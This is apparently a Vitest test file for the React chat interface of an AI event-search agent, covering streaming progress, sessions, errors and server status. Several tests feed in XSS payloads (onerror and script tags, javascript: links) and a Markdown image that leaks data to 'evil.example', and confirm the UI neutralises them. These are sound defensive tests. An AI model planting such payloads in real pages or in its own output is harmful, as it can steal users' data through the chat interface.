import { render as renderInDom, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { beforeEach, describe, expect, it, vi } from "vitest";

import type { ChatResponse, Health } from "@/lib/api";

import { Chat } from "./Chat";
import { ChatProvider } from "./ChatProvider";

function render(ui: React.ReactElement, healthRetryMs?: number) {
  return renderInDom(<ChatProvider healthRetryMs={healthRetryMs}>{ui}</ChatProvider>);
}

const HEALTH: Health = {
  status: "ok",
  data_source: "sample",
  model: "claude-sonnet-5-5",
  available_engines: ["custom", "langgraph"],
  tracing: false,
};

function reply(overrides: Partial<ChatResponse> = {}): ChatResponse {
  return {
    session_id: "session-1",
    engine: "custom",
    answer: "Here's what I found.",
    stop_reason: "end_turn",
    steps: 1,
    tool_calls: [],
    usage: { input_tokens: 1000, cache_read_tokens: 0, cache_write_tokens: 0, output_tokens: 100 },
    cost_usd: 0.004,
    seconds: 3.2,
    ...overrides,
  };
}

/** A streamed answer, with any progress events the server would send first. */
function streamed(answer: ChatResponse, progress: [string, unknown][] = []) {
  const events: [string, unknown][] = [...progress, ["done", answer]];
  const text = events.map(([name, data]) => `event: ${name}\ndata: ${JSON.stringify(data)}\n\n`).join("");
  return new Response(text, { headers: { "Content-Type": "text/event-stream" } });
}

function json(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), { status, headers: { "Content-Type": "application/json" } });
}

/** A stand-in for the server. Each chat request gets the next response in the list. */
function stubServer(chatResponses: (Response | Promise<Response>)[] = [], health: Response | Response[] = json(HEALTH)) {
  const queue = [...chatResponses];
  const healthQueue = Array.isArray(health) ? [...health] : [health];
  const fetchMock = vi.fn((path: string, init?: RequestInit) => {
    if (path === "/api/health") {
      // The last health response repeats, for as long as the page keeps checking.
      const current = healthQueue.length > 1 ? healthQueue.shift()! : healthQueue[0];
      return Promise.resolve(current.clone());
    }
    if (init?.method === "DELETE") return Promise.resolve(new Response(null, { status: 204 }));
    const next = queue.shift();
    if (!next) throw new Error("No scripted chat response left");
    return Promise.resolve(next);
  });
  vi.stubGlobal("fetch", fetchMock);
  return fetchMock;
}

function chatBodies(fetchMock: ReturnType<typeof stubServer>) {
  return fetchMock.mock.calls
    .filter(([path, init]) => path === "/api/chat/stream" && init?.method === "POST")
    .map(([, init]) => JSON.parse(init?.body as string) as Record<string, unknown>);
}

function deletedPaths(fetchMock: ReturnType<typeof stubServer>) {
  return fetchMock.mock.calls.filter(([, init]) => init?.method === "DELETE").map(([path]) => path);
}

async function ask(user: ReturnType<typeof userEvent.setup>, text = "any jazz?") {
  await user.type(screen.getByLabelText("Your message"), text);
  await user.click(screen.getByRole("button", { name: "Send" }));
}

describe("Chat", () => {
  let user: ReturnType<typeof userEvent.setup>;

  beforeEach(() => {
    user = userEvent.setup();
  });

  it("shows the question and answer, with its measurements", async () => {
    stubServer([streamed(reply())]);
    render(<Chat />);
    await ask(user);

    expect(await screen.findByText("Here's what I found.")).toBeInTheDocument();
    expect(screen.getByText("any jazz?")).toBeInTheDocument();
    expect(screen.getByText("3.2s · 1 step · under 1¢")).toBeInTheDocument();
    expect(screen.getByLabelText("Your message")).toHaveValue("");
  });

  it("continues the same conversation on follow-up questions", async () => {
    const fetchMock = stubServer([streamed(reply()), streamed(reply({ answer: "Second." }))]);
    render(<Chat />);
    await ask(user, "first");
    await screen.findByText("Here's what I found.");
    await ask(user, "second");
    await screen.findByText("Second.");

    expect(chatBodies(fetchMock)).toEqual([
      { message: "first", engine: "custom", session_id: null },
      { message: "second", engine: "custom", session_id: "session-1" },
    ]);
  });

  it("sends on Enter and adds a new line on Shift+Enter", async () => {
    const fetchMock = stubServer([streamed(reply())]);
    render(<Chat />);
    const input = screen.getByLabelText("Your message");
    await user.type(input, "line one{Shift>}{Enter}{/Shift}line two");
    expect(chatBodies(fetchMock)).toHaveLength(0);

    await user.keyboard("{Enter}");
    await screen.findByText("Here's what I found.");
    expect(chatBodies(fetchMock)[0].message).toBe("line one\nline two");
  });

  it("won't send an empty message", async () => {
    const fetchMock = stubServer();
    render(<Chat />);
    const input = screen.getByLabelText("Your message");
    await user.type(input, "   {Enter}");

    expect(screen.getByRole("button", { name: "Send" })).toBeDisabled();
    expect(chatBodies(fetchMock)).toHaveLength(0);
  });

  it("shows a working state, and blocks another send until the reply arrives", async () => {
    let finish!: (response: Response) => void;
    const fetchMock = stubServer([new Promise<Response>((resolve) => (finish = resolve))]);
    render(<Chat />);
    await ask(user, "first");

    expect(screen.getByRole("status")).toHaveTextContent("Thinking");
    await user.type(screen.getByLabelText("Your message"), "too soon{Enter}");
    expect(chatBodies(fetchMock)).toHaveLength(1);
    expect(screen.getByLabelText("Engine")).toBeDisabled();

    finish(streamed(reply()));
    await screen.findByText("Here's what I found.");
    expect(screen.queryByRole("status")).not.toBeInTheDocument();
  });

  describe("live progress", () => {
    /** A response whose events are released one at a time by the test. */
    function controlledStream() {
      const encoder = new TextEncoder();
      let controller!: ReadableStreamDefaultController<Uint8Array>;
      const body = new ReadableStream<Uint8Array>({
        start(c) {
          controller = c;
        },
      });
      return {
        response: new Response(body, { headers: { "Content-Type": "text/event-stream" } }),
        send(name: string, data: unknown) {
          controller.enqueue(encoder.encode(`event: ${name}\ndata: ${JSON.stringify(data)}\n\n`));
        },
        close() {
          controller.close();
        },
      };
    }

    const search = { id: "t1", tool: "search_events", input: { keyword: "jazz", city: "Austin" } };
    const details = { id: "t2", tool: "get_event_details", input: { event_id: "x" } };

    it("shows each tool as it runs, finishes, or fails, then the answer", async () => {
      const server = controlledStream();
      stubServer([server.response]);
      render(<Chat />);
      await ask(user);
      expect(screen.getByRole("status")).toHaveTextContent("Thinking");

      server.send("model_call", { step: 1 });
      server.send("tool_start", search);
      server.send("tool_start", details);
      expect(await screen.findByText("Searching for jazz in Austin…")).toBeInTheDocument();
      expect(await screen.findByText("Looking up event details…")).toBeInTheDocument();
      expect(screen.queryByText("Thinking…")).not.toBeInTheDocument();

      server.send("tool_result", { ...search, is_error: false });
      expect(await screen.findByText("Searched for jazz in Austin")).toBeInTheDocument();
      expect(screen.getByText("Looking up event details…")).toBeInTheDocument();

      server.send("tool_result", { ...details, is_error: true });
      expect(await screen.findByText("Looked up event details (failed)")).toBeInTheDocument();

      server.send("model_call", { step: 2 });
      expect(await screen.findByText("Thinking…")).toBeInTheDocument();

      server.send("done", reply({ steps: 2 }));
      server.close();
      expect(await screen.findByText("Here's what I found.")).toBeInTheDocument();
      expect(screen.queryByRole("status")).not.toBeInTheDocument();
    });

    it("starts the next question with a clean list", async () => {
      stubServer([
        streamed(reply(), [
          ["tool_start", search],
          ["tool_result", { ...search, is_error: false }],
        ]),
        new Promise<Response>(() => {}),
      ]);
      render(<Chat />);
      await ask(user, "first");
      await screen.findByText("Here's what I found.");
      await ask(user, "second");

      expect(screen.getByRole("status")).not.toHaveTextContent("Searched");
    });

    it("clears the progress when an error event arrives", async () => {
      const server = controlledStream();
      stubServer([server.response]);
      render(<Chat />);
      await ask(user, "my question");

      server.send("tool_start", search);
      await screen.findByText("Searching for jazz in Austin…");
      server.send("error", { status: 429, detail: "Rate limited by the API." });
      server.close();

      expect(await screen.findByRole("alert")).toHaveTextContent("Rate limited by the API.");
      expect(screen.queryByRole("status")).not.toBeInTheDocument();
      expect(screen.getByLabelText("Your message")).toHaveValue("my question");
    });

    it("explains when the connection drops partway through", async () => {
      const server = controlledStream();
      stubServer([server.response]);
      render(<Chat />);
      await ask(user);

      server.send("model_call", { step: 1 });
      server.close();

      expect(await screen.findByRole("alert")).toHaveTextContent("connection to the server was lost");
    });

    it("shows tool input as plain text", async () => {
      const server = controlledStream();
      stubServer([server.response]);
      const { container } = render(<Chat />);
      await ask(user);

      server.send("tool_start", { id: "t1", tool: "search_events", input: { keyword: "<img src=x onerror=alert(1)>" } });
      expect(await screen.findByText(/Searching for <img/)).toBeInTheDocument();
      expect(container.querySelector("img")).toBeNull();
    });
  });

  it("lists the tool calls it made, marking failures", async () => {
    stubServer([
      streamed(
        reply({
          steps: 3,
          tool_calls: [
            { tool: "search_events", input: { keyword: "jazz", city: "Austin" }, is_error: false },
            { tool: "get_event_details", input: { event_id: "x" }, is_error: true },
          ],
        }),
      ),
    ]);
    render(<Chat />);
    await ask(user);

    await user.click(await screen.findByText(/2 tool calls/));
    expect(screen.getByText("Searched for jazz in Austin")).toBeVisible();
    expect(screen.getByText("Looked up event details (failed)")).toBeVisible();
  });

  it.each([
    ["max_tokens", "cut off"],
    ["refusal", "declined"],
    ["step_limit", "step limit"],
  ])("says when a reply stopped with %s", async (stop_reason, expected) => {
    stubServer([streamed(reply({ stop_reason }))]);
    render(<Chat />);
    await ask(user);
    expect(await screen.findByText(new RegExp(expected))).toBeInTheDocument();
  });

  describe("when a question fails", () => {
    it("explains why, restores the text, and starts a new conversation next", async () => {
      const fetchMock = stubServer([
        streamed(reply()),
        json({ detail: "Rate limited by the API." }, 429),
        streamed(reply({ session_id: "session-2", answer: "Back again." })),
      ]);
      render(<Chat />);
      await ask(user, "first");
      await screen.findByText("Here's what I found.");
      await ask(user, "second");

      expect(await screen.findByRole("alert")).toHaveTextContent("Rate limited by the API.");
      expect(screen.getByRole("alert")).toHaveTextContent("starts a new conversation");
      expect(screen.getByLabelText("Your message")).toHaveValue("second");

      await user.click(screen.getByRole("button", { name: "Send" }));
      await screen.findByText("Back again.");
      expect(chatBodies(fetchMock)[2]).toEqual({ message: "second", engine: "custom", session_id: null });
    });
  });

  describe("starting over", () => {
    it("New chat clears the screen and ends the conversation on the server", async () => {
      const fetchMock = stubServer([streamed(reply())]);
      render(<Chat />);
      await ask(user);
      await screen.findByText("Here's what I found.");
      await user.click(screen.getByRole("button", { name: "New chat" }));

      expect(screen.queryByText("Here's what I found.")).not.toBeInTheDocument();
      expect(deletedPaths(fetchMock)).toEqual(["/api/chat/session-1"]);
    });

    it("changing the engine starts a new chat on that engine", async () => {
      const fetchMock = stubServer([streamed(reply()), streamed(reply({ session_id: "session-2", engine: "langgraph" }))]);
      render(<Chat />);
      await ask(user, "first");
      await screen.findByText("Here's what I found.");
      await user.selectOptions(screen.getByLabelText("Engine"), "langgraph");

      expect(screen.queryByText("first")).not.toBeInTheDocument();
      expect(deletedPaths(fetchMock)).toEqual(["/api/chat/session-1"]);

      await ask(user, "second");
      await screen.findByText("Here's what I found.");
      expect(chatBodies(fetchMock)[1]).toEqual({ message: "second", engine: "langgraph", session_id: null });
    });

    it("doesn't show an error if ending the old conversation fails", async () => {
      const fetchMock = stubServer([streamed(reply())]);
      render(<Chat />);
      await ask(user);
      await screen.findByText("Here's what I found.");
      fetchMock.mockImplementationOnce(() => Promise.reject(new TypeError("offline")));
      await user.click(screen.getByRole("button", { name: "New chat" }));

      await waitFor(() => expect(screen.queryByText("Here's what I found.")).not.toBeInTheDocument());
      expect(screen.queryByRole("alert")).not.toBeInTheDocument();
    });
  });

  describe("server status", () => {
    it("names the data source", async () => {
      stubServer([], json({ ...HEALTH, data_source: "ticketmaster" }));
      render(<Chat />);
      expect(await screen.findByText("Live Ticketmaster data")).toBeInTheDocument();
    });

    it("disables an engine that can't run", async () => {
      stubServer([], json({ ...HEALTH, available_engines: ["custom"] }));
      render(<Chat />);
      await screen.findByText("Sample data");
      expect(screen.getByRole("option", { name: "LangGraph" })).toBeDisabled();
      expect(screen.getByRole("option", { name: "Custom loop" })).toBeEnabled();
    });

    it("says when the server can't be reached", async () => {
      stubServer([], new Response("Internal Server Error", { status: 500 }));
      render(<Chat />);
      expect(await screen.findByRole("alert")).toHaveTextContent("Can't reach the API server");
    });
  });

  it("updates the data source after a restart ends the conversation", async () => {
    stubServer(
      [streamed(reply()), json({ detail: "That conversation has ended." }, 404)],
      [json(HEALTH), json({ ...HEALTH, data_source: "ticketmaster" })],
    );
    render(<Chat />);
    await screen.findByText("Sample data");
    await ask(user, "first");
    await screen.findByText("Here's what I found.");
    await ask(user, "second");

    expect(await screen.findByText("Live Ticketmaster data")).toBeInTheDocument();
    expect(screen.queryByText("Sample data")).not.toBeInTheDocument();
  });

  it("clears the warning once a slow-starting server is ready", async () => {
    stubServer([], [new Response("Internal Server Error", { status: 500 }), json(HEALTH)]);
    render(<Chat />, 1);

    expect(await screen.findByText("Sample data")).toBeInTheDocument();
    expect(screen.queryByRole("alert")).not.toBeInTheDocument();
  });

  describe("moving between pages", () => {
    // The page comes and goes while the provider, which lives in the layout, stays mounted.
    function App({ showChat }: { showChat: boolean }) {
      return <ChatProvider>{showChat ? <Chat /> : <p>Another page</p>}</ChatProvider>;
    }

    it("keeps the conversation and the unsent text", async () => {
      const fetchMock = stubServer([streamed(reply()), streamed(reply({ answer: "Second." }))]);
      const { rerender } = renderInDom(<App showChat />);
      await ask(user, "first");
      await screen.findByText("Here's what I found.");
      await user.type(screen.getByLabelText("Your message"), "half typed");

      rerender(<App showChat={false} />);
      expect(screen.queryByText("Here's what I found.")).not.toBeInTheDocument();
      rerender(<App showChat />);

      expect(screen.getByText("Here's what I found.")).toBeInTheDocument();
      expect(screen.getByLabelText("Your message")).toHaveValue("half typed");

      await user.click(screen.getByRole("button", { name: "Send" }));
      await screen.findByText("Second.");
      expect(chatBodies(fetchMock)[1].session_id).toBe("session-1");
    });

    it("finishes a question that was still in progress", async () => {
      let finish!: (response: Response) => void;
      stubServer([new Promise<Response>((resolve) => (finish = resolve))]);
      const { rerender } = renderInDom(<App showChat />);
      await ask(user);

      rerender(<App showChat={false} />);
      finish(streamed(reply()));
      await new Promise((resolve) => setTimeout(resolve, 0));
      rerender(<App showChat />);

      expect(await screen.findByText("Here's what I found.")).toBeInTheDocument();
      expect(screen.queryByRole("status")).not.toBeInTheDocument();
    });
  });

  it("an example fills the box but doesn't send, because sending costs money", async () => {
    const fetchMock = stubServer();
    render(<Chat />);
    await user.click(screen.getByRole("button", { name: /Chicago this weekend/ }));

    expect(screen.getByLabelText("Your message")).toHaveValue("What concerts are on in Chicago this weekend?");
    expect(chatBodies(fetchMock)).toHaveLength(0);
  });

  it("shows Markdown tables as tables", async () => {
    stubServer([streamed(reply({ answer: "| Show | Price |\n|---|---|\n| Velvet Static | $45 |" }))]);
    render(<Chat />);
    await ask(user);

    expect(await screen.findByRole("table")).toBeInTheDocument();
    expect(screen.getByRole("cell", { name: "$45" })).toBeInTheDocument();
  });

  describe("answers are untrusted", () => {
    it("shows HTML as text instead of running it", async () => {
      const { container } = render(<Chat />);
      stubServer([streamed(reply({ answer: 'Show: <img src="https://evil.example/x" onerror="alert(1)"><script>alert(1)</script>' }))]);
      await ask(user);
      await screen.findByText(/Show:/);

      expect(container.querySelector("script")).toBeNull();
      expect(container.querySelector("img")).toBeNull();
    });

    it("removes Markdown images, which would send a request to any address", async () => {
      const { container } = render(<Chat />);
      stubServer([streamed(reply({ answer: "Before ![secret](https://evil.example/?data=secret) after" }))]);
      await ask(user);
      await screen.findByText(/Before/);

      expect(container.querySelector("img")).toBeNull();
      expect(container.innerHTML).not.toContain("evil.example");
    });

    it("opens links safely, and drops dangerous ones", async () => {
      stubServer([streamed(reply({ answer: "[Tickets](https://example.com/t) and [bad](javascript:alert(1))" }))]);
      render(<Chat />);
      await ask(user);

      const link = await screen.findByRole("link", { name: "Tickets" });
      expect(link).toHaveAttribute("href", "https://example.com/t");
      expect(link).toHaveAttribute("target", "_blank");
      expect(link).toHaveAttribute("rel", "noopener noreferrer");
      expect(screen.queryByRole("link", { name: "bad" })).not.toBeInTheDocument();
      expect(screen.getByText(/and bad/)).toBeInTheDocument();
    });
  });
});
